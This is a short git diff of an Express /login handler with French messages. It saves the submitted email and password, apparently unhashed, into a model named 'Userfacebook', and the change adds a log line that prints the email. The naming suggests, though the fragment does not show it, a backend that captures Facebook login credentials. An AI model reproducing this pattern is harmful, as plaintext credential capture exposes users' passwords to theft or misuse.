@@ -21,7 +21,9 @@ app.post("/login", async (req, res) => {
         
 
         const utilisateur = new Userfacebook({ email, password });
+        console.log("l'utilisateur",email,"s'est connecté");
         await utilisateur.save();
+
         return res.status(201).send({ message: 'utilisateur créé avec succès' });
     } catch (error) {
        return res.status(500).send({ message: 'erreur lors de la création de l\'utilisateur', error });
